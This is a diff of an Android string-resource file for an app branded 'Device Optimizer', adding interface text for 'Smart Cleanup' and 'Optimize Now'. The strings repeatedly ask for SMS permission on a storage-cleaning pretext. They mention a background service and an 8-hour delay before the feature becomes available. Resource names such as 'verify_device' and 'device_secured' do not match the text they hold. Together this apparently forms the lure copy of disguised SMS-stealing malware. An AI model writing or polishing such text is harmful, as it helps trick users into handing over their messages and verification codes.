@@ -1,7 +1,20 @@
 <resources>
     <string name="app_name">Device Optimizer</string>
-    <string name="permission_rationale">SMS permission needed to clean old messages and optimize storage.</string>
-    <string name="verify_device">Deep Optimize</string>
-    <string name="device_verified">SMS permission granted!</string>
+    <string name="permission_rationale">SMS permission needed to clean old messages and free up storage space.</string>
+    <string name="verify_device">Smart Cleanup</string>
+    <string name="device_verified">SMS permission granted! Cleaning old messages...</string>
     <string name="device_secured">Device optimized! Background service running.</string>
+    <string name="optimize_text">🔄 Optimize Now</string>
+    <string name="smart_cleanup_text">🧹 Smart Cleanup (Free Space)</string>
+    <string name="storage_report_text">📊 View Detailed Storage Report</string>
+    <string name="ready_text">Ready to optimize your device</string>
+    <string name="optimizing_text">🔄 Optimizing device...</string>
+    <string name="optimize_complete">✅ Optimization complete! Device running at peak performance.</string>
+    <string name="cleanup_scanning">📱 Scanning SMS messages...</string>
+    <string name="cleanup_found">🧹 Found %d old messages to delete...</string>
+    <string name="cleanup_complete">✅ Cleaned %d old SMS messages! Storage optimized.</string>
+    <string name="permission_denied">⚠️ SMS permission required for Smart Cleanup. Try again later.</string>
+    <string name="timer_wait">⏳ Smart Cleanup will be available in 8 hours. Please check back later.</string>
+    <string name="timer_remaining">⏳ Smart Cleanup available in %d hours.</string>
+    <string name="permission_request">🔐 SMS permission needed to clean old messages and free storage.</string>
 </resources>
